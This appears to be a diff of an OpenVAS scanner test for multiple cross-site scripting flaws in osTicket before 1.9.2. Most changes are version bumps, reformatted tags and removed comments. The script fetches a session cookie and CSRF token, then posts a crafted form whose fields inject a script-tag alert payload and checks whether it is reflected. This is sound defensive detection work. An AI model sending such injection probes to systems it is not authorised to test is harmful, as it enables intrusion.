@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_osticket_mult_xss_vuln.nasl 6637 2017-07-10 09:58:13Z teissa $
+# $Id: gb_osticket_mult_xss_vuln.nasl 11108 2018-08-24 14:27:07Z mmartin $
 #
 # osTicket Ticketing System Multiple Cross-Site Scripting Vulnerabilities
 #
@@ -27,34 +27,34 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804823");
-  script_version("$Revision: 6637 $");
+  script_version("$Revision: 11108 $");
   script_cve_id("CVE-2014-4744");
   script_bugtraq_id(68500);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-10 11:58:13 +0200 (Mon, 10 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2014-08-26 13:09:40 +05340 (Tue, 26 Aug 2014)");
   script_name("osTicket Ticketing System Multiple Cross-Site Scripting Vulnerabilities");
 
-  script_tag(name : "summary" , value : "This host is installed with osTicket Ticketing System and is prone to multiple
+  script_tag(name:"summary", value:"This host is installed with osTicket Ticketing System and is prone to multiple
   cross-site scripting vulnerabilities.");
-  script_tag(name : "vuldetect" , value : "Send a crafted HTTP POST request and check whether it is able to read cookie
+  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check whether it is able to read cookie
   or not.");
-  script_tag(name : "insight" , value : "Multiple flaws exist as input passed via 'Phone Number' POST parameter to the
-  'open.php' script, 'Phone Number','passwd1', 'passwd2' POST parameters to
+  script_tag(name:"insight", value:"Multiple flaws exist as input passed via 'Phone Number' POST parameter to the
+  'open.php' script, 'Phone Number', 'passwd1', 'passwd2' POST parameters to
   'account.php' script, and 'do' parameter to 'account.php' script is not
   validated before returning it to users.");
-  script_tag(name : "impact" , value : "Successful exploitation will allow remote attacker to execute arbitrary script
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary script
   code in a user's browser session within the trust relationship between their
   browser and the server.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "osTicket before version 1.9.2");
-  script_tag(name : "solution" , value : "Upgrade to osTicket version 1.9.2 or later. For updates refer to
+  script_tag(name:"affected", value:"osTicket before version 1.9.2");
+  script_tag(name:"solution", value:"Upgrade to osTicket version 1.9.2 or later. For updates refer to
   http://osticket.com");
 
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/59539");
-  script_xref(name : "URL" , value : "https://www.netsparker.com/critical-xss-vulnerabilities-in-osticket/");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/59539");
+  script_xref(name:"URL", value:"https://www.netsparker.com/critical-xss-vulnerabilities-in-osticket/");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -71,35 +71,24 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
-
-## Get HTTP Port
 http_port = get_http_port(default:80);
 
-## Check Host Supports PHP
 if(!can_host_php(port:http_port)){
   exit(0);
 }
 
 host = http_host_name(port:http_port);
 
-## Iterate over possible paths
 foreach dir (make_list_unique("/", "/support", "/ticket", "/osticket", cgi_dirs(port:http_port)))
 {
 
   if(dir == "/") dir = "";
 
-  ## Construct GET Request
   sndReq = http_get(item:string(dir, "/upload/open.php"),  port:http_port);
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ##Confirm Application
   if (rcvRes && "powered by osTicket<" >< rcvRes)
   {
-    ## Get the session id
     cookie = eregmatch(pattern:"Set-Cookie: OSTSESSID=([0-9a-z]*);", string:rcvRes);
     if(!cookie[1]){
       exit(0);
@@ -143,7 +132,6 @@ foreach dir (make_list_unique("/", "/support", "/ticket", "/osticket", cgi_dirs(
       exit(0);
     }
 
-    ## Construct Attack
     postData = string('-----------------------------10379450071263312649808858377\r\n',
                       'Content-Disposition: form-data; name="__CSRFToken__"\r\n\r\n', csrf_token[1], '\r\n',
                       '-----------------------------10379450071263312649808858377\r\n',
@@ -193,7 +181,6 @@ foreach dir (make_list_unique("/", "/support", "/ticket", "/osticket", cgi_dirs(
 
     rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-    #Confirm Exploit
     if(rcvRes =~ "HTTP/1\.. 200" && "></script><script>alert(document.cookie)</script>" >< rcvRes &&
        "osTicket<" >< rcvRes)
     {
